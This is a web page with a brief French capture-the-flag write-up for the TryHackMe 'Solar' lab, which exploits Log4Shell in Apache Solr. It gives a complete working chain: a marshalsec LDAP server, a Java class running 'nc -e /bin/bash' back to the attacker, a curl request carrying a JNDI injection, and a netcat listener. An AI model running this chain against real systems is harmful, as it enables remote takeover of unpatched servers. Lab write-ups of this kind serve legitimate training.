<!doctype html><html lang=en><head><meta charset=utf-8><title> Solar</title><meta content="width=device-width,initial-scale=1.0" name=viewport><link href=https://cestef.github.io/yctf.ch/css/main.css rel=stylesheet><link href=https://cestef.github.io/yctf.ch/rss.xml rel=alternate title=RSS type=application/rss+xml><link href=https://cestef.github.io/yctf.ch/atom.xml rel=alternate title=RSS type=application/atom+xml><script crossorigin src=https://cdn.jsdelivr.net/npm/@twemoji/api@latest/dist/twemoji.min.js></script><script crossorigin src=https://cdn.jsdelivr.net/npm/fuse.js@7.1.0/dist/fuse.basic.min.js></script><script defer src=https://cestef.github.io/yctf.ch/js/main.js></script><script defer src=https://cestef.github.io/yctf.ch/search_index.en.js></script><body class=min-h-[100svh]><div class="w-[50svw] md:w-96 bg-popover absolute left-1/2 top-1/3 transform -translate-x-1/2 -translate-y-1/2 hidden shadow-lg" id=goto-popup><input class="w-full h-8 lg:h-12 px-2 py-1 lg:px-4 lg:py-2" id=goto-input placeholder=Search><div class="w-full h-0.5 bg-muted"></div><div class="w-full max-h-96 overflow-y-auto flex flex-col" id=goto-results></div></div><a class="top-0 left-0 fixed" href=https://cestef.github.io/yctf.ch> <div class="h-18 md:h-26 lg:h-32 p-2 md:p-4"><div class="w-full h-full flex items-center justify-center"><div class="w-full h-full [&>svg]:w-full [&>svg]:h-full [&>svg]:object-contain invert-colors select-none"><svg viewbox="0 0 300 300" fill=none id=screenshot-7d103f36-f396-80db-8006-db36b9f17880 version=1.1 xmlns=http://www.w3.org/2000/svg xmlns:xlink=http://www.w3.org/1999/xlink><g id=shape-7d103f36-f396-80db-8006-db36b9f17880 rx=0 ry=0><g id=shape-7d103f36-f396-80db-8006-db36b9f17882 rx=0 ry=0><g id=shape-7d103f36-f396-80db-8006-db36b9f17883><g transform="matrix(1.000000, 0.000000, 0.000000, 1.000000, 0.000000, 0.000000)" class=text-container height=126 rx=0 ry=0 width=124 x=26 y=24><defs><pattern height=170 id=fill-0-render-4-0 patternunits=objectBoundingBox width=77.40625><g><rect height=170 style=fill:#e63e3d;fill-opacity:1 width=77.40625 /></g></pattern></defs><g class=fills id=fills-7d103f36-f396-80db-8006-db36b9f17883><text style="text-transform:none;letter-spacing:normal;white-space:pre;fill:#e63e3d;fill-opacity:1;direction:ltr;font-family:JetBrains Mono;font-size:129px;font-style:normal;font-weight:800;text-decoration:none" dominant-baseline=ideographic lengthadjust=spacingAndGlyphs textlength=77.40625 x=49.296875 y=171.6015625>Y</text></g></g></g><g id=shape-7d103f36-f396-80db-8006-db36b9f17884><g transform="matrix(1.000000, 0.000000, 0.000000, 1.000000, 0.000000, 0.000000)" class=text-container height=126 rx=0 ry=0 width=124 x=150 y=24><defs><pattern height=170 id=fill-0-render-5-0 patternunits=objectBoundingBox width=77.40625><g><rect height=170 style=fill:#e63e3d;fill-opacity:1 width=77.40625 /></g></pattern></defs><g class=fills id=fills-7d103f36-f396-80db-8006-db36b9f17884><text style="text-transform:none;letter-spacing:normal;white-space:pre;fill:#e63e3d;fill-opacity:1;direction:ltr;font-family:JetBrains Mono;font-size:129px;font-style:normal;font-weight:800;text-decoration:none" dominant-baseline=ideographic lengthadjust=spacingAndGlyphs textlength=77.40625 x=173.296875 y=171.6015625>C</text></g></g></g><g id=shape-7d103f36-f396-80db-8006-db36b9f17885><g transform="matrix(1.000000, 0.000000, 0.000000, 1.000000, 0.000000, 0.000000)" class=text-container height=126 rx=0 ry=0 width=124 x=26 y=150><defs><pattern height=170 id=fill-0-render-6-0 patternunits=objectBoundingBox width=77.40625><g><rect height=170 style=fill:#e63e3d;fill-opacity:1 width=77.40625 /></g></pattern></defs><g class=fills id=fills-7d103f36-f396-80db-8006-db36b9f17885><text style="text-transform:none;letter-spacing:normal;white-space:pre;fill:#e63e3d;fill-opacity:1;direction:ltr;font-family:JetBrains Mono;font-size:129px;font-style:normal;font-weight:800;text-decoration:none" dominant-baseline=ideographic lengthadjust=spacingAndGlyphs textlength=77.40625 x=49.296875 y=297.6015625>T</text></g></g></g><g id=shape-7d103f36-f396-80db-8006-db36b9f17886><g transform="matrix(1.000000, 0.000000, 0.000000, 1.000000, 0.000000, 0.000000)" class=text-container height=126 rx=0 ry=0 width=124 x=150 y=150><defs><pattern height=170 id=fill-0-render-7-0 patternunits=objectBoundingBox width=77.40625><g><rect height=170 style=fill:#e63e3d;fill-opacity:1 width=77.40625 /></g></pattern></defs><g class=fills id=fills-7d103f36-f396-80db-8006-db36b9f17886><text style="text-transform:none;letter-spacing:normal;white-space:pre;fill:#e63e3d;fill-opacity:1;direction:ltr;font-family:JetBrains Mono;font-size:129px;font-style:normal;font-weight:800;text-decoration:none" dominant-baseline=ideographic lengthadjust=spacingAndGlyphs textlength=77.40625 x=173.296875 y=297.6015625>F</text></g></g></g></g></g></svg></div></div></div> </a><div class="text-secondary-foreground mx-6 md:py-2 py-1 font-black text-lg lg:text-xl top-0 right-0 fixed w-18 md:w-26 h-18 md:h-26 lg:h-32 p-2 md:p-4 text-center flex items-center justify-center"></div><main id=scroll-element><div class="mt-24 mx-4 mb-24 sm:mx-0"><article class="prose dark:prose-invert mx-auto lg:prose-lg"><h1>Solar <span class="text-muted-foreground text-xl">by david-pellissier</span></h1><div class="flex flex-row gap-4 items-center"><span><strong>2021-12-15</strong></span><span class=text-muted-foreground>(1 min. read)</span> - <span class="flex flex-row gap-2"> <a class="bg-accent text-accent-foreground px-2 py-1 rounded-md text-sm w-fit font-bold no-underline" href=/misc> misc </a> </span><div class=flex-grow></div></div><h2 id=writeup-de-la-room-solar>Writeup de la room "Solar"</h2><p>Lien: https://tryhackme.com/room/solar<p>Docker: <strong><code>sudo docker run -it --name "Kali" -p 1234:1234 -p 8000:8000 -p 1389:1389 kalilinux/kali /bin/bash </code></strong><p>Installer toutes les dépendances:<pre class="language-bash z-code" data-lang=bash><code class=language-bash data-lang=bash><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-support z-function z-cd z-shell">cd</span></span><span class="z-meta z-function-call z-arguments z-shell"> home</span>
</span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">apt</span></span><span class="z-meta z-function-call z-arguments z-shell"> update</span>
</span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">apt</span></span><span class="z-meta z-function-call z-arguments z-shell"> install<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>y</span> netcat-traditional python3 curl wget git maven nano vim</span>
</span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">wget</span></span><span class="z-meta z-function-call z-arguments z-shell"> https://github.com/adoptium/temurin8-binaries/releases/download/jdk8u312-b07/OpenJDK8U-jdk_x64_linux_hotspot_8u312b07.tar.gz</span>
</span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">tar</span></span><span class="z-meta z-function-call z-arguments z-shell"> xzf OpenJDK8U-jdk_x64_linux_hotspot_8u312b07.tar.gz </span>
</span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-support z-function z-echo z-shell">echo</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-string z-quoted z-single z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">'</span>export PATH=$PWD/jdk8u312-b07/bin:$PATH<span class="z-punctuation z-definition z-string z-end z-shell">'</span></span> <span class="z-keyword z-operator z-assignment z-redirection z-shell">>></span> .bashrc</span>
</span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">git</span></span><span class="z-meta z-function-call z-arguments z-shell"> clone https://github.com/mbechler/marshalsec</span>
</span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-support z-function z-cd z-shell">cd</span></span><span class="z-meta z-function-call z-arguments z-shell"> marshalsec</span>
</span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">mvn</span></span><span class="z-meta z-function-call z-arguments z-shell"> clean package<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>DskipTests</span></span>
</span></code></pre><p>Lancer le serveur LDAP<pre class="language-bash z-code" data-lang=bash><code class=language-bash data-lang=bash><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">java</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>cp</span> target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">"</span>http://10.9.77.76:8000/#Exploit	
</span></span></span></code></pre><p>Créer le reverse shell<pre class="language-bash z-code" data-lang=bash><code class=language-bash data-lang=bash><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-support z-function z-cd z-shell">cd</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span></span>
</span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">mkdir</span></span><span class="z-meta z-function-call z-arguments z-shell"> exploit</span>
</span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-support z-function z-cd z-shell">cd</span></span><span class="z-meta z-function-call z-arguments z-shell"> exploit</span>
</span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">nano</span></span><span class="z-meta z-function-call z-arguments z-shell"> Exploit.java <span class="z-comment z-line z-number-sign z-shell"><span class="z-punctuation z-definition z-comment z-begin z-shell">#</span></span><span class="z-comment z-line z-number-sign z-shell"> puis insérer le code ci-dessous</span><span class="z-comment z-line z-number-sign z-shell">
</span></span></span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">javac</span></span><span class="z-meta z-function-call z-arguments z-shell"> Exploit.java</span>
</span></code></pre><pre class="language-java z-code" data-lang=java><code class=language-java data-lang=java><span class="z-source z-java"><span class="z-meta z-class z-java"><span class="z-storage z-modifier z-java">public</span> <span class="z-meta z-class z-identifier z-java"><span class="z-storage z-type z-java">class</span> <span class="z-entity z-name z-class z-java">Exploit</span></span> <span class="z-meta z-class z-body z-java"><span class="z-meta z-block z-java"><span class="z-punctuation z-section z-block z-begin z-java">{</span>
</span></span></span></span><span class="z-source z-java"><span class="z-meta z-class z-java"><span class="z-meta z-class z-body z-java"><span class="z-meta z-block z-java">    <span class="z-storage z-modifier z-java">static</span> <span class="z-meta z-static z-body z-java"><span class="z-punctuation z-section z-block z-begin z-java">{</span>
</span></span></span></span></span><span class="z-source z-java"><span class="z-meta z-class z-java"><span class="z-meta z-class z-body z-java"><span class="z-meta z-block z-java"><span class="z-meta z-static z-body z-java">        <span class="z-keyword z-control z-exception z-try z-java">try</span> <span class="z-meta z-block z-java"><span class="z-punctuation z-section z-block z-begin z-java">{</span>
</span></span></span></span></span></span><span class="z-source z-java"><span class="z-meta z-class z-java"><span class="z-meta z-class z-body z-java"><span class="z-meta z-block z-java"><span class="z-meta z-static z-body z-java"><span class="z-meta z-block z-java">            <span class="z-meta z-path z-java"><span class="z-support z-type z-package z-java">java</span><span class="z-punctuation z-accessor z-dot z-java">.</span><span class="z-support z-type z-package z-java">lang</span><span class="z-punctuation z-accessor z-dot z-java">.</span><span class="z-support z-class z-java">Runtime</span></span><span class="z-punctuation z-accessor z-dot z-java">.</span><span class="z-meta z-function-call z-java"><span class="z-variable z-function z-java">getRuntime</span><span class="z-punctuation z-section z-parens z-begin z-java">(</span><span class="z-punctuation z-section z-parens z-end z-java">)</span></span><span class="z-punctuation z-accessor z-dot z-java">.</span><span class="z-meta z-function-call z-java"><span class="z-variable z-function z-java">exec</span><span class="z-punctuation z-section z-parens z-begin z-java">(</span><span class="z-string z-quoted z-double z-java"><span class="z-punctuation z-definition z-string z-begin z-java">"</span>nc -e /bin/bash 10.9.77.76 1234<span class="z-punctuation z-definition z-string z-end z-java">"</span></span><span class="z-punctuation z-section z-parens z-end z-java">)</span></span><span class="z-punctuation z-terminator z-java">;</span>
</span></span></span></span></span></span><span class="z-source z-java"><span class="z-meta z-class z-java"><span class="z-meta z-class z-body z-java"><span class="z-meta z-block z-java"><span class="z-meta z-static z-body z-java"><span class="z-meta z-block z-java">        <span class="z-punctuation z-section z-block z-end z-java">}</span></span> <span class="z-meta z-catch z-java"><span class="z-keyword z-control z-exception z-catch z-java">catch</span> </span><span class="z-meta z-catch z-parameters z-java"><span class="z-meta z-parens z-java"><span class="z-punctuation z-section z-parens z-begin z-java">(</span><span class="z-support z-class z-java">Exception</span> <span class="z-variable z-parameter z-java">e</span><span class="z-punctuation z-section z-parens z-end z-java">)</span></span></span> <span class="z-meta z-block z-java"><span class="z-punctuation z-section z-block z-begin z-java">{</span>
</span></span></span></span></span></span><span class="z-source z-java"><span class="z-meta z-class z-java"><span class="z-meta z-class z-body z-java"><span class="z-meta z-block z-java"><span class="z-meta z-static z-body z-java"><span class="z-meta z-block z-java">            e<span class="z-punctuation z-accessor z-dot z-java">.</span><span class="z-meta z-function-call z-java"><span class="z-variable z-function z-java">printStackTrace</span><span class="z-punctuation z-section z-parens z-begin z-java">(</span><span class="z-punctuation z-section z-parens z-end z-java">)</span></span><span class="z-punctuation z-terminator z-java">;</span>
</span></span></span></span></span></span><span class="z-source z-java"><span class="z-meta z-class z-java"><span class="z-meta z-class z-body z-java"><span class="z-meta z-block z-java"><span class="z-meta z-static z-body z-java"><span class="z-meta z-block z-java">        <span class="z-punctuation z-section z-block z-end z-java">}</span></span>
</span></span></span></span></span><span class="z-source z-java"><span class="z-meta z-class z-java"><span class="z-meta z-class z-body z-java"><span class="z-meta z-block z-java"><span class="z-meta z-static z-body z-java">    <span class="z-punctuation z-section z-block z-end z-java">}</span></span>
</span></span></span></span><span class="z-source z-java"><span class="z-meta z-class z-java"><span class="z-meta z-class z-body z-java"><span class="z-meta z-block z-java"><span class="z-punctuation z-section z-block z-end z-java">}</span></span></span></span>
</span></code></pre><p>Lancer le serveur python<pre class="language-bash z-code" data-lang=bash><code class=language-bash data-lang=bash><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">python3</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>m</span> http.server</span>
</span></code></pre><p>Ouvrir la connexion du reverse shell:<pre class=z-code><code><span class="z-text z-plain">nc -lnvp 1234
</span></code></pre><p>Exécuter:<pre class="language-bash z-code" data-lang=bash><code class=language-bash data-lang=bash><span class="z-source z-shell z-bash"> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">curl</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-string z-quoted z-single z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">'</span>http://10.10.91.84:8983/solr/admin/cores?foo=$\{jndi:ldap://10.9.77.76:1389/Exploit\}<span class="z-punctuation z-definition z-string z-end z-shell">'</span></span></span>
</span></code></pre><p>Résultat: on a un shell<p>À noter qu'il n'y a pas de "décoration" du shell au départ, mais qu'on peut quand même exécuter des commandes.<p>Pour rendre "user-friendly" le shell on peut lancer cette commande:<pre class="language-bash z-code" data-lang=bash><code class=language-bash data-lang=bash><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">python3</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>c</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">"</span>import pty; pty.spawn('/bin/bash')<span class="z-punctuation z-definition z-string z-end z-shell">"</span></span></span>
</span></code></pre></article></div></main><div class="bg-secondary text-primary-foreground w-fit fixed bottom-4 float-right right-8 transition-all duration-200 opacity-0" title="Scroll to top" id=scroll-to-top><div class="bg-primary h-full absolute -z-10" id=scroll-fill></div><svg class="h-6 w-6 mx-4 md:my-2 my-1 fill-primary-foreground" viewbox="0 0 16 16" xmlns=http://www.w3.org/2000/svg><path d="M3.47 7.78a.75.75 0 0 1 0-1.06l4.25-4.25a.75.75 0 0 1 1.06 0l4.25 4.25a.751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018L9 4.81v7.44a.75.75 0 0 1-1.5 0V4.81L4.53 7.78a.75.75 0 0 1-1.06 0Z"></path></svg></div>